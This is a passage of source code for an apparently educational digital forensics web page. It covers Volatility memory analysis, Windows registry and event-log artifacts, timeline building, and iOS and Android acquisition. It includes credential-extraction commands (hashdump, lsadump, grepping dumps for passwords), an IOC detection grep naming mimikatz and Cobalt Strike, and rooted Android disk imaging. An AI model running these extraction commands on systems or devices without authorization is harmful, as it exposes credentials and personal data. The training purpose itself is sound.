vol -f memory.dmp windows.memmap --pid 1234 --dump

# YARA scanning in memory
vol -f memory.dmp windows.vadyarascan --yara-file malware_rules.yar

# Check for process hollowing
vol -f memory.dmp windows.vadinfo --pid 1234`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Credential Extraction</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Alert severity="warning" sx={{ mb: 2 }}>
                    Only perform credential extraction with proper authorization. Document everything for chain of custody.
                  </Alert>
                  <CodeBlock
                    language="bash"
                    code={`# Windows - Extract cached credentials
vol -f memory.dmp windows.hashdump

# Windows - LSA secrets
vol -f memory.dmp windows.lsadump

# Windows - Cached domain credentials
vol -f memory.dmp windows.cachedump

# Mimikatz-style extraction (requires symbols)
vol -f memory.dmp windows.skeleton_key_check

# Check for cleartext passwords in memory
strings memory.dmp | grep -i "password"

# Linux - Extract /etc/shadow hashes from memory
vol -f memory.dmp linux.bash     # Check bash history first
vol -f memory.dmp linux.cached_creds`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Linux Memory Forensics</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <CodeBlock
                    language="bash"
                    code={`# Acquire Linux memory
# LiME (Linux Memory Extractor)
sudo insmod lime.ko "path=/tmp/memory.lime format=lime"

# AVML (Microsoft's tool)
sudo ./avml /tmp/memory.raw

# Volatility 3 Linux plugins
vol -f memory.lime linux.bash        # Bash history
vol -f memory.lime linux.pslist      # Process list
vol -f memory.lime linux.pstree      # Process tree
vol -f memory.lime linux.lsof        # Open files
vol -f memory.lime linux.sockstat    # Network connections
vol -f memory.lime linux.mount       # Mounted filesystems
vol -f memory.lime linux.check_afinfo    # Rootkit detection
vol -f memory.lime linux.check_syscall   # Syscall hooks
vol -f memory.lime linux.elfs        # Extract ELF binaries
vol -f memory.lime linux.keyboard_notifiers  # Keylogger detection`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Network Artifacts in Memory</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <CodeBlock
                    language="bash"
                    code={`# List network connections
vol -f memory.dmp windows.netstat
vol -f memory.dmp windows.netscan

# Example output:
# Offset    Proto  LocalAddr         ForeignAddr       State      PID
# 0x...     TCPv4  192.168.1.5:49234 23.45.67.89:443   ESTABLISHED 3456
# 0x...     TCPv4  0.0.0.0:445       *:*               LISTENING   4

# Look for:
# - Connections to known bad IPs
# - Unusual ports (4444, 5555, 6666 = common C2)
# - Processes that shouldn't have network connections
# - Connections from terminated processes (orphan sockets)`}
                  />
                  <Alert severity="info" sx={{ mt: 2 }}>
                    <strong>Tip:</strong> Cross-reference PIDs from netstat with pslist to identify which process made each connection.
                  </Alert>
                </AccordionDetails>
              </Accordion>
            </Paper>

            {/* Windows Artifacts Section */}
            <Paper id="windows-artifacts" sx={{ p: 3, mb: 4, bgcolor: themeColors.bgCard, borderRadius: 2, border: `1px solid ${themeColors.border}` }}>
              <Typography variant="h5" sx={{ color: themeColors.primary, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <FolderIcon /> Windows Forensic Artifacts
              </Typography>

              <Paper sx={{ p: 2.5, mb: 3, bgcolor: themeColors.bgNested, borderRadius: 2 }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#e2e8f0" }}>
                  Lesson: Windows Leaves Breadcrumbs Everywhere
                </Typography>
                <Typography variant="body1" sx={{ color: themeColors.textMuted, lineHeight: 1.8, mb: 2 }}>
                  Windows systems create artifacts for usability and performance. Those same artifacts are gold for
                  investigators. For example, Prefetch files show which programs executed and when. LNK files show
                  what a user opened. The Registry records system settings, installed programs, and user activity.
                </Typography>
                <Typography variant="body2" sx={{ color: themeColors.textMuted, lineHeight: 1.7, mb: 2 }}>
                  Do not rely on a single artifact. Combine registry keys, event logs, and file system timestamps to
                  confirm a user action. If you see a suspicious executable in Prefetch, check the file path in the MFT,
                  then confirm execution in the Event Logs.
                </Typography>
                <Grid container spacing={2}>
                  {[
                    { title: "Registry", desc: "Installed software, user settings, recent files, USB history." },
                    { title: "Event Logs", desc: "Logons, process creation, service changes, log clearing events." },
                    { title: "Prefetch", desc: "Program execution history and last run time." },
                    { title: "LNK/Jump Lists", desc: "User opened files and folders with timestamps." },
                    { title: "Shellbags", desc: "Folder navigation history, even for deleted folders." },
                    { title: "Amcache/Shimcache", desc: "Execution traces for binaries and installers." },
                  ].map((artifact) => (
                    <Grid item xs={12} sm={6} key={artifact.title}>
                      <Paper sx={{ p: 2, bgcolor: themeColors.bgCard, borderRadius: 2 }}>
                        <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#e2e8f0", mb: 0.5 }}>
                          {artifact.title}
                        </Typography>
                        <Typography variant="caption" sx={{ color: themeColors.textMuted }}>
                          {artifact.desc}
                        </Typography>
                      </Paper>
                    </Grid>
                  ))}
                </Grid>
              </Paper>

              <TableContainer component={Paper} sx={{ bgcolor: themeColors.bgNested, mb: 3 }}>
                <Table size="small">
                  <TableHead>
                    <TableRow>
                      <TableCell sx={{ color: themeColors.primary }}>Artifact</TableCell>
                      <TableCell sx={{ color: themeColors.primary }}>Location</TableCell>
                      <TableCell sx={{ color: themeColors.primary }}>Evidence Value</TableCell>
                    </TableRow>
                  </TableHead>
                  <TableBody>
                    {[
                      ["Prefetch", "C:\\Windows\\Prefetch\\*.pf", "Program execution, timestamps"],
                      ["Event Logs", "C:\\Windows\\System32\\winevt\\Logs\\", "Security events, logins, process creation"],
                      ["Registry (NTUSER)", "C:\\Users\\*\\NTUSER.DAT", "User activity, recent files, typed paths"],
                      ["Registry (SYSTEM)", "C:\\Windows\\System32\\config\\SYSTEM", "Services, USB history, timezone"],
                      ["Amcache", "C:\\Windows\\appcompat\\Programs\\Amcache.hve", "Program execution with SHA1 hashes"],
                      ["Shimcache", "SYSTEM\\CurrentControlSet\\Control\\SessionManager\\AppCompatCache", "Execution evidence, modification times"],
                      ["SRUM", "C:\\Windows\\System32\\sru\\SRUDB.dat", "App usage, network usage, energy usage"],
                      ["$MFT", "C:\\$MFT", "File system metadata, timestamps"],
                      ["USN Journal", "C:\\$Extend\\$UsnJrnl", "File system changes log"],
                      ["Browser Data", "C:\\Users\\*\\AppData\\Local\\*\\User Data\\", "History, downloads, cookies"],
                    ].map(([artifact, location, value]) => (
                      <TableRow key={artifact}>
                        <TableCell><Chip label={artifact} size="small" sx={{ bgcolor: themeColors.primary }} /></TableCell>
                        <TableCell sx={{ color: themeColors.textMuted, fontFamily: "monospace", fontSize: "0.8rem" }}>{location}</TableCell>
                        <TableCell sx={{ color: "#e2e8f0" }}>{value}</TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </TableContainer>

              <Alert severity="success" sx={{ bgcolor: `${themeColors.primary}15`, color: "#e2e8f0", mb: 3 }}>
                <strong>Pro Tip:</strong> Use Eric Zimmerman's tools (PECmd, EvtxECmd, Registry Explorer) for fast artifact parsing.
              </Alert>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" } }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Windows Event Log Analysis</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Typography variant="body2" sx={{ color: themeColors.textMuted, mb: 2 }}>
                    Critical Event IDs to investigate:
                  </Typography>
                  <TableContainer>
                    <Table size="small">
                      <TableHead>
                        <TableRow>
                          <TableCell sx={{ color: themeColors.primary }}>Event ID</TableCell>
                          <TableCell sx={{ color: themeColors.primary }}>Log</TableCell>
                          <TableCell sx={{ color: themeColors.primary }}>Description</TableCell>
                        </TableRow>
                      </TableHead>
                      <TableBody>
                        {[
                          ["4624", "Security", "Successful logon"],
                          ["4625", "Security", "Failed logon"],
                          ["4648", "Security", "Explicit credential logon (RunAs)"],
                          ["4672", "Security", "Special privileges assigned (admin logon)"],
                          ["4688", "Security", "Process creation (with command line if enabled)"],
                          ["4698", "Security", "Scheduled task created"],
                          ["4720", "Security", "User account created"],
                          ["4732", "Security", "User added to security group"],
                          ["7045", "System", "Service installed"],
                          ["1102", "Security", "Audit log cleared - SUSPICIOUS"],
                        ].map(([id, log, desc]) => (
                          <TableRow key={id}>
                            <TableCell sx={{ color: "#f472b6", fontFamily: "monospace", fontWeight: 600 }}>{id}</TableCell>
                            <TableCell sx={{ color: themeColors.secondary }}>{log}</TableCell>
                            <TableCell sx={{ color: "#e2e8f0" }}>{desc}</TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </TableContainer>
                  <CodeBlock
                    language="bash"
                    code={`# Parse Windows Event Logs with EvtxECmd
EvtxECmd.exe -d C:\\Windows\\System32\\winevt\\Logs\\ --csv . --csvf all_logs.csv

# Filter specific events with PowerShell
Get-WinEvent -Path Security.evtx -FilterXPath "*[System[EventID=4624]]"

# Python evtx library
pip install python-evtx
python -c "from Evtx.Evtx import Evtx; [print(r.xml()) for r in Evtx('Security.evtx').records()]"

# Chainsaw - Fast forensic log analysis
chainsaw hunt ./evtx_files/ --rules sigma_rules/ --mapping mappings/`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Registry Analysis</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <CodeBlock
                    language="bash"
                    code={`# Key Registry Locations for Forensics

# Persistence Mechanisms
HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce
HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
HKLM\\SYSTEM\\CurrentControlSet\\Services  # Services

# User Activity
HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs
HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPaths
HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU

# Network
HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces
HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NetworkList\\Profiles

# USB Devices
HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR
HKLM\\SYSTEM\\MountedDevices

# Parse with RegRipper
regripper -r NTUSER.DAT -p all > user_report.txt
regripper -r SYSTEM -p all > system_report.txt`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Program Execution Artifacts</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Grid container spacing={2}>
                    <Grid item xs={12} md={6}>
                      <Paper sx={{ p: 2, bgcolor: themeColors.bgNested }}>
                        <Typography sx={{ color: "#3b82f6", fontWeight: 600, mb: 1 }}>Prefetch</Typography>
                        <Typography variant="body2" sx={{ color: themeColors.textMuted, mb: 1 }}>
                          Shows program execution with timestamps and run count.
                        </Typography>
                        <CodeBlock
                          language="bash"
                          code={`# Parse Prefetch files
PECmd.exe -d C:\\Windows\\Prefetch\\ --csv . --csvf prefetch.csv

# Python alternative
pip install prefetch
prefetch_parser.py *.pf`}
                        />
                      </Paper>
                    </Grid>
                    <Grid item xs={12} md={6}>
                      <Paper sx={{ p: 2, bgcolor: themeColors.bgNested }}>
                        <Typography sx={{ color: "#8b5cf6", fontWeight: 600, mb: 1 }}>Amcache</Typography>
                        <Typography variant="body2" sx={{ color: themeColors.textMuted, mb: 1 }}>
                          Contains SHA1 hashes of executed programs.
                        </Typography>
                        <CodeBlock
                          language="bash"
                          code={`# Parse Amcache
AmcacheParser.exe -f Amcache.hve --csv . --csvf amcache.csv

# Contains:
# - Full path
# - SHA1 hash
# - First execution time
# - File size`}
                        />
                      </Paper>
                    </Grid>
                    <Grid item xs={12} md={6}>
                      <Paper sx={{ p: 2, bgcolor: themeColors.bgNested }}>
                        <Typography sx={{ color: "#10b981", fontWeight: 600, mb: 1 }}>Shimcache</Typography>
                        <Typography variant="body2" sx={{ color: themeColors.textMuted, mb: 1 }}>
                          Application compatibility cache in SYSTEM hive.
                        </Typography>
                        <CodeBlock
                          language="bash"
                          code={`# Parse Shimcache
AppCompatCacheParser.exe -f SYSTEM --csv . --csvf shimcache.csv`}
                        />
                      </Paper>
                    </Grid>
                    <Grid item xs={12} md={6}>
                      <Paper sx={{ p: 2, bgcolor: themeColors.bgNested }}>
                        <Typography sx={{ color: themeColors.secondary, fontWeight: 600, mb: 1 }}>SRUM</Typography>
                        <Typography variant="body2" sx={{ color: themeColors.textMuted, mb: 1 }}>
                          System Resource Usage Monitor - app/network history.
                        </Typography>
                        <CodeBlock
                          language="bash"
                          code={`# Parse SRUM
SrumECmd.exe -f SRUDB.dat --csv . --csvf srum.csv

# Shows app usage per hour
# Network bytes sent/received`}
                        />
                      </Paper>
                    </Grid>
                  </Grid>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Browser Forensics</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <CodeBlock
                    language="bash"
                    code={`# Browser artifact locations
# Chrome
C:\\Users\\*\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\
  - History (SQLite)
  - Downloads (SQLite)
  - Login Data (encrypted)
  - Cookies (SQLite)

# Firefox
C:\\Users\\*\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*.default\\
  - places.sqlite (history + bookmarks)
  - downloads.sqlite
  - cookies.sqlite
  - logins.json + key4.db

# Edge (Chromium)
C:\\Users\\*\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\

# Parse Chrome history
sqlite3 History "SELECT url, title, visit_count, datetime(last_visit_time/1000000-11644473600,'unixepoch') FROM urls ORDER BY last_visit_time DESC"

# Parse downloads
sqlite3 History "SELECT target_path, url, datetime(start_time/1000000-11644473600,'unixepoch') FROM downloads"

# Hindsight - Browser forensics tool
python hindsight.py -i /path/to/Chrome/User\ Data/Default -o report`}
                  />
                </AccordionDetails>
              </Accordion>
            </Paper>

            {/* Timeline Section */}
            <Paper id="timeline" sx={{ p: 3, mb: 4, bgcolor: themeColors.bgCard, borderRadius: 2, border: `1px solid ${themeColors.border}` }}>
              <Typography variant="h5" sx={{ color: themeColors.primary, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <HistoryIcon /> Timeline Analysis
              </Typography>

              <Alert severity="info" sx={{ mb: 3, bgcolor: `${themeColors.primary}15`, color: "#e2e8f0" }}>
                Timelines correlate events across multiple sources to reconstruct what happened and when.
              </Alert>

              <Paper sx={{ p: 2.5, mb: 3, bgcolor: themeColors.bgNested, borderRadius: 2 }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#e2e8f0" }}>
                  Lesson: How to Build a Reliable Timeline
                </Typography>
                <Typography variant="body1" sx={{ color: themeColors.textMuted, lineHeight: 1.8, mb: 2 }}>
                  A timeline is your story of events in chronological order. It helps you answer the questions "what
                  happened first" and "what followed." Reliable timelines require time normalization. Different systems
                  log in different time zones, and some clocks drift. Always normalize to UTC when possible.
                </Typography>
                <Typography variant="body2" sx={{ color: themeColors.textMuted, lineHeight: 1.7, mb: 2 }}>
                  A beginner-friendly approach is to start with three sources: Event Logs, file system timestamps, and
                  browser history. Once you have those in order, add higher detail sources like Prefetch, registry keys,
                  and network logs. When a timeline shows a gap, investigate why. It might be missing logs, or it might be
                  evidence that logs were cleared.
                </Typography>
                <List dense>
                  {[
                    "Normalize timestamps to a single time zone.",
                    "Start with high-confidence sources (Event Logs, MFT).",
                    "Correlate file creation with process execution.",
                    "Use at least two artifacts to confirm each key action.",
                    "Document any time drift or log gaps.",
                  ].map((item) => (
                    <ListItem key={item} sx={{ py: 0.25 }}>
                      <ListItemIcon><CheckCircleIcon sx={{ color: themeColors.primary }} /></ListItemIcon>
                      <ListItemText primary={item} sx={{ "& .MuiListItemText-primary": { color: "#e2e8f0" } }} />
                    </ListItem>
                  ))}
                </List>
              </Paper>

              <Accordion defaultExpanded sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" } }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Creating a Super Timeline</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <CodeBlock
                    language="bash"
                    code={`# Using log2timeline (plaso) to create super timeline
log2timeline.py --storage-file timeline.plaso evidence.dd

# Parse to CSV for analysis
psort.py -o l2tcsv timeline.plaso -w timeline.csv

# Filter by date range
psort.py -o l2tcsv timeline.plaso "date > '2024-01-01' AND date < '2024-01-31'" -w filtered.csv

# Alternative: Use Autopsy's timeline feature for GUI analysis`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Timeline Analysis Tips</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <List>
                    {[
                      "Identify the incident timeframe first, then expand",
                      "Correlate file system timestamps with event logs",
                      "Look for anti-forensic activity (timestomping)",
                      "Note timezone differences between systems",
                      "Use pivot points: known malicious file, first detection, lateral movement",
                    ].map((tip) => (
                      <ListItem key={tip}>
                        <ListItemIcon><CheckCircleIcon sx={{ color: themeColors.primary }} /></ListItemIcon>
                        <ListItemText primary={tip} sx={{ "& .MuiListItemText-primary": { color: "#e2e8f0" } }} />
                      </ListItem>
                    ))}
                  </List>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Manual Timeline Creation</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Typography variant="body2" sx={{ color: themeColors.textMuted, mb: 2 }}>
                    When you need precise control over timeline entries:
                  </Typography>
                  <CodeBlock
                    language="bash"
                    code={`# Extract timestamps from MFT
fls -m "/" -r image.dd > bodyfile.txt

# Convert bodyfile to timeline
mactime -b bodyfile.txt -d > timeline.csv

# Combine multiple sources
cat event_logs.csv prefetch.csv mft_timeline.csv | sort -t',' -k1 > combined.csv

# Timeline with Sleuth Kit
tsk_gettimes image.dd > times.txt

# Parse specific artifact timestamps
# Prefetch: PECmd with timestamps
PECmd.exe -d ./Prefetch --csv . --csvf prefetch_times.csv

# Event logs: timestamps in ISO format
EvtxECmd.exe -d ./evtx --csv . --csvf events.csv`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Timeline Visualization</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Grid container spacing={2}>
                    {[
                      { tool: "Timesketch", desc: "Web-based collaborative timeline analysis", color: "#3b82f6" },
                      { tool: "Autopsy Timeline", desc: "Built into Autopsy, GUI-based filtering", color: "#8b5cf6" },
                      { tool: "log2timeline/plaso", desc: "Command-line, most comprehensive", color: "#10b981" },
                      { tool: "Excel/Sheets", desc: "Simple but effective for small datasets", color: themeColors.secondary },
                    ].map((item) => (
                      <Grid item xs={12} sm={6} key={item.tool}>
                        <Paper sx={{ p: 2, bgcolor: themeColors.bgNested, border: `1px solid ${item.color}30` }}>
                          <Typography sx={{ color: item.color, fontWeight: 600 }}>{item.tool}</Typography>
                          <Typography variant="body2" sx={{ color: themeColors.textMuted }}>{item.desc}</Typography>
                        </Paper>
                      </Grid>
                    ))}
                  </Grid>
                  <CodeBlock
                    language="bash"
                    code={`# Timesketch setup with Docker
docker-compose up -d  # From timesketch repo

# Import plaso file
timesketch_importer.py -u http://localhost:5000 timeline.plaso

# Query syntax in Timesketch
data_type:"windows:evtx:record" AND event_identifier:4624
source_short:"LOG" AND timestamp > "2024-01-15"`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Timeline Correlation Example</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Alert severity="info" sx={{ mb: 2, bgcolor: `${themeColors.primary}15`, color: "#e2e8f0" }}>
                    Example: Tracing a ransomware attack through correlated events
                  </Alert>
                  <TableContainer>
                    <Table size="small">
                      <TableHead>
                        <TableRow>
                          <TableCell sx={{ color: themeColors.primary }}>Time</TableCell>
                          <TableCell sx={{ color: themeColors.primary }}>Source</TableCell>
                          <TableCell sx={{ color: themeColors.primary }}>Event</TableCell>
                          <TableCell sx={{ color: themeColors.primary }}>Significance</TableCell>
                        </TableRow>
                      </TableHead>
                      <TableBody>
                        {[
                          ["09:15:23", "Email Logs", "Malicious attachment opened", "Initial access"],
                          ["09:15:45", "Prefetch", "powershell.exe first execution", "Payload execution"],
                          ["09:16:02", "Event 4688", "cmd.exe spawned by WINWORD.EXE", "Child process"],
                          ["09:16:30", "Netstat", "Connection to 45.33.32.156:443", "C2 communication"],
                          ["09:17:15", "Event 4698", "Scheduled task created", "Persistence"],
                          ["09:45:00", "MFT", "Mass .encrypted extensions", "Encryption started"],
                          ["09:47:33", "Event 1102", "Security log cleared", "Anti-forensics"],
                        ].map(([time, source, event, sig]) => (
                          <TableRow key={time}>
                            <TableCell sx={{ color: themeColors.secondary, fontFamily: "monospace" }}>{time}</TableCell>
                            <TableCell sx={{ color: "#a5b4fc" }}>{source}</TableCell>
                            <TableCell sx={{ color: "#e2e8f0" }}>{event}</TableCell>
                            <TableCell sx={{ color: "#f87171" }}>{sig}</TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </TableContainer>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Advanced Filtering</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <CodeBlock
                    language="bash"
                    code={`# Plaso filtering examples

# Filter by source type
psort.py -o l2tcsv timeline.plaso "source_short == 'EVT'" -w events_only.csv

# Filter by user
psort.py -o l2tcsv timeline.plaso "username contains 'admin'" -w admin_activity.csv

# Filter by file path
psort.py -o l2tcsv timeline.plaso "filename contains 'Temp'" -w temp_files.csv

# Combine filters
psort.py -o l2tcsv timeline.plaso \\
  "date > '2024-01-15' AND date < '2024-01-16' AND source_short == 'FILE'" \\
  -w day_files.csv

# Grep timeline for IOCs
grep -E "mimikatz|cobalt|beacon" timeline.csv > suspicious.csv

# Timeline analysis with jq (JSON output)
psort.py -o json timeline.plaso | jq 'select(.source_short == "REG")'`}
                  />
                </AccordionDetails>
              </Accordion>
            </Paper>

            {/* Mobile Forensics Section */}
            <Paper id="mobile-forensics" sx={{ p: 3, mb: 4, bgcolor: themeColors.bgCard, borderRadius: 2, border: `1px solid ${themeColors.border}` }}>
              <Typography variant="h5" sx={{ color: themeColors.primary, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <PhoneAndroidIcon /> Mobile Device Forensics
              </Typography>

              <Alert severity="warning" sx={{ mb: 3 }}>
                <strong>Legal Note:</strong> Mobile devices often contain highly personal data. Ensure proper authorization before examination.
              </Alert>

              <Accordion defaultExpanded sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" } }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>iOS Forensics</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Typography variant="body2" sx={{ color: themeColors.textMuted, mb: 2 }}>
                    iOS devices are notoriously difficult to forensically examine due to encryption.
                  </Typography>
                  <TableContainer>
                    <Table size="small">
                      <TableHead>
                        <TableRow>
                          <TableCell sx={{ color: themeColors.primary }}>Acquisition Type</TableCell>
                          <TableCell sx={{ color: themeColors.primary }}>Requirements</TableCell>
                          <TableCell sx={{ color: themeColors.primary }}>Data Access</TableCell>
                        </TableRow>
                      </TableHead>
                      <TableBody>
                        {[
                          ["iTunes Backup", "Passcode or trusted computer", "Most app data, messages, photos"],
                          ["iCloud Backup", "Apple ID credentials", "Same as iTunes + some cloud data"],
                          ["Logical (libimobiledevice)", "Jailbreak or lockdown certificate", "File system access"],
                          ["Full File System", "Jailbreak + SSH", "Complete file system including keychain"],
                          ["Physical (BFU)", "Cellebrite/GrayKey", "Limited - before first unlock"],
                          ["Physical (AFU)", "Cellebrite/GrayKey + passcode", "Full decryption"],
                        ].map(([type, req, access]) => (
                          <TableRow key={type}>
                            <TableCell sx={{ color: "#a5b4fc", fontWeight: 500 }}>{type}</TableCell>
                            <TableCell sx={{ color: themeColors.textMuted }}>{req}</TableCell>
                            <TableCell sx={{ color: "#e2e8f0" }}>{access}</TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </TableContainer>
                  <CodeBlock
                    language="bash"
                    code={`# Using libimobiledevice (open source)
# Install
brew install libimobiledevice  # macOS
apt install libimobiledevice-utils  # Linux

# List connected devices
idevice_id -l

# Device information
ideviceinfo -u <UDID>

# Create backup
idevicebackup2 backup --full ./backup_folder

# Extract backup (use iBackup tools)
# Key SQLite databases:
# - sms.db - Messages
# - AddressBook.sqlitedb - Contacts
# - call_history.db - Call logs
# - consolidated.db - Location history

# Parse iOS backup with iLEAPP
python ileapp.py -i ./backup_folder -o ./output

# Location: /private/var/mobile/Library/`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Android Forensics</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <CodeBlock
                    language="bash"
                    code={`# ADB (Android Debug Bridge) acquisition
# Enable USB debugging on device first

# Check connection
adb devices

# Device info
adb shell getprop ro.build.fingerprint

# Logical acquisition - pull user data
adb pull /sdcard/ ./evidence/sdcard/
adb pull /data/data/ ./evidence/apps/  # Requires root

# Full backup
adb backup -apk -shared -all -f backup.ab

# Extract backup
java -jar abe.jar unpack backup.ab backup.tar

# Key locations:
# /data/data/<app>/databases/ - App SQLite DBs
# /data/data/com.android.providers.contacts/databases/contacts2.db
# /data/data/com.android.providers.telephony/databases/mmssms.db
# /data/media/0/ - User files (photos, downloads)

# ALEAPP - Android parser
python aleapp.py -i ./evidence -o ./output

# Physical acquisition with root
adb shell
su
dd if=/dev/block/mmcblk0 | gzip > /sdcard/full_image.gz
exit
adb pull /sdcard/full_image.gz`}
                  />
                  <Alert severity="info" sx={{ mt: 2 }}>
                    <strong>Tip:</strong> Samsung devices have Knox which may wipe data on root attempts. Use commercial tools for sensitive cases.
                  </Alert>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Key Mobile Artifacts</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Grid container spacing={2}>
                    {[
                      { title: "Messages", artifacts: ["SMS/MMS databases", "iMessage/Signal/WhatsApp", "Deleted message recovery"], color: "#3b82f6" },
                      { title: "Location", artifacts: ["GPS coordinates", "Cell tower logs", "WiFi connection history", "Photo EXIF data"], color: "#10b981" },
                      { title: "Communications", artifacts: ["Call logs", "Contacts", "Voicemail", "FaceTime/video calls"], color: "#8b5cf6" },
                      { title: "Apps", artifacts: ["Browser history", "Social media data", "Email", "Installed app list"], color: themeColors.secondary },
                      { title: "Media", artifacts: ["Photos & videos", "Screenshots", "Audio recordings", "Downloads"], color: "#ef4444" },
                      { title: "System", artifacts: ["WiFi passwords", "Bluetooth pairings", "Notification history", "Keyboard cache"], color: "#06b6d4" },
                    ].map((cat) => (
